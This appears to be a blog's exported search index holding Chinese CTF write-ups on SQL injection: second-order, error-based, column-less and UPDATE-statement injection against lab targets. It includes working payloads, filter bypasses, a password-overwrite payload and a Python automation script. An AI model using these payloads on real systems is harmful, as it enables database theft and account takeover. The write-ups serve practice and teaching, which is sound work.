<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF</title>
    <url>/2024/08/09/BUUCTF/</url>
    <content><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>一个登录页面，应该要先注册进入</p>
<p>随便注册</p>
<p>进入发现可以修改密码 第一想法就是二次注入</p>
<h2 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h2><p>参考文章：<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，**恶意数据被读取并进入到SQL查询语句**所导致的注入。防御者即使对用户输入的恶意数据进行转义，当数据插入到数据库中时被处理的数据又被还原，Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</span><br><span class="line"></span><br><span class="line">也就是说一次攻击造成不了什么，但是两次配合起来就会造成注入漏洞。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL二次注入，指的是在有些应用场景下，我们先把SQL注入的payload写入到目标站点数据库中，然后再在某些实际将该数据取出，使得我们写入的payload执行。</span><br><span class="line">因此，SQL二次注入一般分为2步，第一步即向目标站点的数据库中插入恶意数据，第二步即使得我们插入的恶意数据被目标站点所引用。</span><br><span class="line">SQL二次注入的实现，在第一步要求我们插入的恶意数据能够成功写入到目标站点的数据库中，站点可以对我们写入的恶意数据进行转义，但是数据本身不会被修改，也不会因为恶意的数据而拒绝我们的写入；第二步要求我们的恶意数据能够在某种应用场景下取出，并且不会对其站点内部的数据进行检验</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以也就是满足这两个条件即可</span><br><span class="line"></span><br><span class="line">用户向数据库插入恶意数据，即使后端对语句做了转义，如mysql_escape_string、mysql_real_escape_string等函数</span><br><span class="line"></span><br><span class="line">数据库能够将恶意数据取出</span><br></pre></td></tr></table></figure>



<p>这里情况相符</p>
<p>现在注册页面构造恶意的payload</p>
<p>fuzz发现uesrname这”没过滤</p>
<p>在注册账号这里username 这写入Gu0f3n”</p>
<p>修改密码这发现报错</p>
<p>猜测语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>&quot;Gu0f3n&quot; &quot; and password=&#x27; 5134f78f6e827c2a7e8767020cf23cbf&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>双引号闭合有报错</p>
<p>尝试报错注入</p>
<p>||用来拼接 发现空格 &#x2F;**&#x2F;同时被过滤了括号绕过空格</p>
<p>直接查表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘:article,flag,users’</p>
<p>查列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘:flag’</p>
<p>flag在user表里</p>
<p>这里有个坑</p>
<p>因为限制长度所以列名没有显示清楚regexp(‘’^r’)</p>
<p>用来把想要的列名筛选出来and被过滤了用&amp;&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1))#</span><br><span class="line">#XPATH syntax error: &#x27;real_flag_1s_here&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘:name,pwd,email,real_flag_1s_here’</p>
<p><code>regexp</code> 是一个正则表达式匹配操作符，通常用于检查某个字符串是否符合指定的正则表达式模式。</p>
<p>整个 <code>regexp(&#39;^f&#39;)</code> 的作用是筛选出 <strong>以字母 <code>f</code> 开头的值</strong>。<code>^</code>：表示匹配字符串的开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘~flag{24b07aef-f8cc-4348-a482-12’</p>
<p>过滤了substr mid 等函数 用reverse函数</p>
<p>反转即可<a href="https://tool.box3.cn/reverse.html">https://tool.box3.cn/reverse.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘~}c4d832e9db21-284a-8434-cc8f-fe’</p>
<p>反转拼接即可</p>
<p>flag{24b07aef-f8cc-4348-a482-12bd9e238d4c}</p>
<p>重开靶机用脚本试试</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_reg = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//register.php&#x27;</span></span><br><span class="line">url_log = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//login.php&#x27;</span></span><br><span class="line">url_change = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pre = <span class="string">&#x27;Gu0f3n&quot;&#x27;</span></span><br><span class="line"><span class="comment"># 逆序闭合</span></span><br><span class="line">suf = <span class="string">&quot;&#x27;)))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正序闭合</span></span><br><span class="line"><span class="comment"># suf = &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span></span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_reg, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_log, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changepwd</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;oldpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    kk = r.post(url=url_change, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> kk.text:</span><br><span class="line">        <span class="built_in">print</span>(kk.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># 正序</span></span><br><span class="line">    <span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + suf</span></span><br><span class="line">    <span class="comment"># 逆序</span></span><br><span class="line">    paylaod = pre + <span class="string">&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot;</span> + i + suf</span><br><span class="line">    register(paylaod)</span><br><span class="line">    login(paylaod)</span><br><span class="line">    changepwd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正序payload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"><span class="comment"># 逆序payload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;)))),1))#&quot;</span></span><br></pre></td></tr></table></figure>

<p>先正序在逆序</p>
<p>之后拼接一下就可以出</p>
<p>flag{95001f84-9ad6-499b-9a06-9c0d2e6b8d4c}</p>
<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>二次注入 </p>
<p>简介这有回显</p>
<p>原理一样，注册页面没有过滤 直接盲猜表和列为flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select flag from flag#</span><br></pre></td></tr></table></figure>

<p>flag{77a8ffbc-ad0e-4968-be7e-4c81898910a6}</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><strong>注入点在password</strong> </p>
<p>替换为空的是select union or </p>
<p>正常注入即可</p>
]]></content>
      <categories>
        <category>sql刷题笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF</title>
    <url>/2024/08/06/NSSCTF-sql/</url>
    <content><![CDATA[<h1 id="HNCTF-2022-WEEK2-easy-sql"><a href="#HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="[HNCTF 2022 WEEK2]easy_sql"></a>[HNCTF 2022 WEEK2]easy_sql</h1><p>参考文章：<a href="https://blog.csdn.net/Jayjay___/article/details/132956781">https://blog.csdn.net/Jayjay___/article/details/132956781</a></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这题考察了无列名注入</p>
<p>我们常用的<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>方法是通过<code>information_schema</code>这个默认数据库来实现，可是你有没有想过，如果过滤了该数据库那么我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p>
<p><strong>InnoDb引擎</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表（mysql.innodb_table_stats），这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure>

<p><strong>sys数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns（sys.schema_auto_increment_columns）来获取表名。</span><br></pre></td></tr></table></figure>

<p>但是上述两种方法都只能查出表名，<strong>无法查到列名</strong>，这时我们就要用到无列名注入了。无列名注入，顾名思义，就是不需要列名就能注出数据的注入。</p>
<p><strong>无列名注入使用条件</strong></p>
<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，<strong>information_schema 库被过滤</strong>，使用这种方法获取列名。</p>
<p><strong>无列名注入原理</strong></p>
<p>无列名注入的原理其实很简单，就是联合查询<strong>创建虚拟数据</strong>。<strong>可以看作将我们不知道的列名进行取别名操作</strong>，在取别名的同时进行数据查询，所以查询字段数一定要相同，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
<h2 id="本地演示"><a href="#本地演示" class="headerlink" title="本地演示"></a>本地演示</h2><p>正常查表</p>
<p> select * from Gu0f3n;<br><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B903%E5%88%86.png" alt="image-20240806200233160"></p>
<p>联合查询表中数据</p>
<p>select 1,2,3 union select * from Gu0f3n;(我这里字段是三，具体情况具体分析)</p>
<p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B904%E5%88%86.png" alt="image-20240806200442297"></p>
<p>很明显创建了虚拟数据（虚拟字段值123和虚拟表），虚拟表中列名变成了123。</p>
<p>只查一列的字段的值我们可以 yyy是自己命名的虚拟表表名，可以自定义这条sql语句在联合查询创建虚拟表xxx，虚拟列1,2,3的同时查询虚拟表第二列的数据。</p>
<p>select <code>2</code> from (select 1,2,3 union select * from Gu0f3n)yyy;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B909%E5%88%86.png" alt="image-20240806200938012"></p>
<p>要查多个列的话</p>
<p>select <code>2</code> ,<code>3</code>from (select 1,2,3 union select * from Gu0f3n)yyy;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240806201127902"></p>
<p>如果有时候把&#96;过滤了我们可以用as</p>
<p>select 1 as a,2 as b, 3 as c union select * from Gu0f3n;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B914%E5%88%86.png" alt="image-20240806201353981"></p>
<p>select b from (select 1 as a,2 as b,3 as c union select * from Gu0f3n)yyy;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B915%E5%88%86.png" alt="image-20240806201450310"></p>
<h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240806201644950"></p>
<p>黑名单应该是这样的<code>&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|flag|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</code></p>
<p>判断类型</p>
<p>因为注释符号都过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;|&#x27;1</span><br></pre></td></tr></table></figure>

<p>发现回显和id&#x3D;1一样确定是字符型</p>
<p>空格&#x2F;**&#x2F;绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;/**/group/**/by/**/3,&#x27;1</span><br></pre></td></tr></table></figure>

<p>发现字段为3</p>
<p>判断回显位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,3/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p>这里where是限制条件 目的还是注释掉闭合</p>
<p>发现回显位置为3</p>
<p>爆库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p>得到这些库名</p>
<p>ctf,ctftraining,ctftraining,ctftraining,mysql</p>
<p>爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p>得到这些表名</p>
<p>ccctttfff,flag,news,users,gtid_slave_pos</p>
<p>上面说过 不能得到列名 我们直接爆值</p>
<p>还得自己一个个试</p>
<p>最终flag 在ctftraining.flag下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27;/**/union/**/select/**/1,2,`6`/**/from/**/(select/**/6/**/union/**/select/**/*/**/from/**/ctftraining.flag)Gu0f3n/**/where&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%886%E6%97%A521%E7%82%B907%E5%88%86.png" alt="image-20240806210746263"></p>
<p>还有有一种闭合方式%00</p>
<p>其他都一样</p>
<h1 id="MoeCTF-2022-Sqlmap-boy"><a href="#MoeCTF-2022-Sqlmap-boy" class="headerlink" title="[MoeCTF 2022]Sqlmap_boy"></a>[MoeCTF 2022]Sqlmap_boy</h1><p>万能密码成功进入</p>
<p>admin” or 1&#x3D;1#</p>
<p>发现注入点 id 闭合方式为单引号字段为3</p>
<p>回显为为 2，3</p>
<p>当前库名为moectf</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>articles,flag,users</p>
<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>flAg</p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0&#x27; union select 1,group_concat(flAg),3 from flag--+</span><br></pre></td></tr></table></figure>

<p>NSSCTF{75b86f27-423b-418f-ac60-08815140a910}</p>
<h1 id="HUBUCTF-2022-新生赛-ezsql"><a href="#HUBUCTF-2022-新生赛-ezsql" class="headerlink" title="[HUBUCTF 2022 新生赛]ezsql"></a>[HUBUCTF 2022 新生赛]ezsql</h1><p>这题提示获得admin的密码</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>参考文章：<a href="https://blog.csdn.net/qq_35599248/article/details/122440184">https://blog.csdn.net/qq_35599248/article/details/122440184</a></p>
<p>我们常见的<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>一般都是基于select语句，但是在update，insert，delete也可以注入。</p>
<p>他们的原理都是当执行时遇到 (表达式1)(and&#x2F;or)(表达式2) ，这种形式的式子时，前后表达式前后都会执行，然后做逻辑运算，最后的结果要么0，要么1。</p>
<p>假如我们sql注入的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3666=3666 AND ′Gu0f3n&#x27;=&#x27;Gu0f3n</span><br></pre></td></tr></table></figure>

<p>SQL查询会变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3666=3666 AND &#x27;Gu0f3n&#x27;=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>id&#x3D;’1’</strong>:<ul>
<li>这个部分将 <code>id</code> 设为 <code>1</code>，并闭合了引号。此时，<code>id</code> 的值实际上为 <code>&#39;1&#39;</code>。</li>
</ul>
</li>
<li><strong>AND 3666&#x3D;3666</strong>:<ul>
<li>这是一个恒真条件，因为3666总是等于3666。这个条件保证了注入部分的合法性，并且在逻辑上不改变查询的结果。</li>
</ul>
</li>
<li><strong>AND ‘Gu0f3n’&#x3D;’Gu0f3n’</strong>:<ul>
<li>这是另一个恒真条件，因为<code>Gu0f3n</code>总是等于<code>Gu0f3n</code>。这进一步确保了查询的合法性。</li>
</ul>
</li>
</ol>
<h3 id="中间插入表达式的位"><a href="#中间插入表达式的位" class="headerlink" title="中间插入表达式的位"></a>中间插入表达式的位</h3><p>这种注入方法的关键在于引入两个恒真条件，使得查询语句在逻辑上始终为真。这种情况下，我们可以在中间的表达式位插入任意的SQL语句，而不会引起语法错误或逻辑错误。</p>
<h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><p>假设我们希望通过SQL注入来查询数据库的版本信息，构造如下的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure>

<p>这个查询会变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; AND 3362=3362 AND (SELECT version())=&#x27;Gu0f3n&#x27;</span><br></pre></td></tr></table></figure>

<p>下面来说一下<a href="https://so.csdn.net/so/search?q=insert&spm=1001.2101.3001.7020">insert</a>，update，delete的注入。</p>
<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>insert语句的格式一般为<br>insert into <teable_name> values (,,,…);<br>当我们发现后面插入值的<strong>某个位置我们可控</strong>时，就可以把那个位置改成多个逻辑连接词的形式，同时insert注入还可以帮助我们任意注册账号。因为插入语句要求我们插入位置的数据类型相同，所以我们要我们可控的位置的数据类型一般都是数值.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and if(1&gt;2,0,sleep(3)),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B950%E5%88%86.png" alt="image-20240807094926093"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into Gu0f3n values(1 and updatexml(1,(select concat(0x7e,version())),3),&#x27;shell&#x27;,&#x27;Gu0f3n&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A509%E7%82%B956%E5%88%86.png" alt="image-20240807095633287"></p>
<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>格式</p>
<p>update <table_name> set column &#x3D; where &lt;条件&gt;</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B912%E5%88%86.png" alt="image-20240807101214936"></p>
<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>delete from <table_name> where &lt;条件&gt;<br>原理还是和上面一样，只是这个要注意一下不要把数据库里面的内容删了，所以一定要保持最后逻辑表达式的结果为假。or连接词慎用。</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A510%E7%82%B914%E5%88%86.png" alt="image-20240807101426609"></p>
<h3 id="回到题目-1"><a href="#回到题目-1" class="headerlink" title="回到题目"></a>回到题目</h3><p>admin弱口令爆破不出</p>
<p>万能密码没试出来</p>
<p>扫目录发现源码泄露</p>
<p>发现update.php</p>
<p>存在sql注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query<span class="operator">=</span>$mysqli<span class="operator">-</span><span class="operator">&gt;</span>query(&quot;update users set age=$_POST[age],nickname=&#x27;$_POST[nickname]&#x27;,description=&#x27;$_POST[description]&#x27; where id=$_SESSION[id]&quot;);</span><br></pre></td></tr></table></figure>

<p>注入点在age这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3n&amp;age=-1,description=(select database())#&amp;description=ss&amp;token=294e68dc4639816cda6dea96ca92603d</span><br></pre></td></tr></table></figure>

<p>爆出库名</p>
<p>demo2</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure>

<p>users</p>
<p>爆列</p>
<p>发现这里将单引号过滤了 </p>
<p>将users转16进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=database())#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure>

<p>id,username,password,nickname,age,description</p>
<p>得到这些列</p>
<p>看到密码拿密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname=Gu0f3b&amp;age=-1,description=(select group_concat(password) users)#&amp;description=sss&amp;token=3ac68ca374a43cc099684f4353f5284d</span><br></pre></td></tr></table></figure>

<p>MD5存储</p>
<p>3691308f2a4c2f6983f2880d32e29c84</p>
<p>更新所有密码(aaa)</p>
<p>nickname&#x3D;Gu0f3b&amp;age&#x3D;11,password&#x3D;0x3437626365356337346635383966343836376462643537653963613966383038#&amp;description&#x3D;sss&amp;token&#x3D;3ac68ca374a43cc099684f4353f5284d</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B957%E5%88%86.png" alt="image-20240807115708531"></p>
<p>给了段md5</p>
<p>解密发现是iamcool</p>
<p>重启靶机</p>
<p>登录admin&#x2F;iamcool</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B959%E5%88%86.png" alt="image-20240807115943261"></p>
<h1 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h1><p>过滤</p>
<p>hacker!!black_list is &#x2F;if|and|\s|#|–&#x2F;i 单引号闭合</p>
<p>%00绕过 空格&#x2F;**&#x2F;</p>
<p>字段一位</p>
<p>暴库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/database();%00</span><br></pre></td></tr></table></figure>

<p>test</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();%00</span><br></pre></td></tr></table></figure>

<p>string(10) “flag,users”</p>
<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;;%00</span><br></pre></td></tr></table></figure>

<p>string(4) “flag”</p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(flag)/**/from/**/flag;%00</span><br></pre></td></tr></table></figure>

<p>string(63) “前有巨大宝箱,NSSCTF{629ea8c3-1d54-4eda-a425-dbb573cf61df}”</p>
<h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h1><p>注册登录进去</p>
<p>发现输进去的东西被转义</p>
<p>这个页面放弃</p>
<p>登录页面估计也不行</p>
<p>注册页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select database() # /123456</span><br></pre></td></tr></table></figure>

<p>闭合方式为’’</p>
<p>然后在登录发现爆库名</p>
<p>ctftraining</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database() # </span><br></pre></td></tr></table></figure>

<p>flag,news,users</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database() # </span><br></pre></td></tr></table></figure>

<p>flag</p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(flag) from flag # </span><br></pre></td></tr></table></figure>

<p>NSSCTF{fe961858-8992-45d4-99a6-2b1427517f09}</p>
<h1 id="UUCTF-2022-新生赛-ezsql"><a href="#UUCTF-2022-新生赛-ezsql" class="headerlink" title="[UUCTF 2022 新生赛]ezsql"></a>[UUCTF 2022 新生赛]ezsql</h1><p>输入万能密码</p>
<p>admin‘) or 1&#x3D;1;#</p>
<p>发现被反转了了而且or被过滤了</p>
<p>&#x2F;&#x2F;<em>your sql:SELECT * FROM users WHERE passwd&#x3D;(‘’) AND username&#x3D;(‘#;1&#x3D;1 )���nimda’) LIMIT 0,1</em></p>
<p><a href="https://www.abcdtools.com/reverse">https://www.abcdtools.com/reverse</a></p>
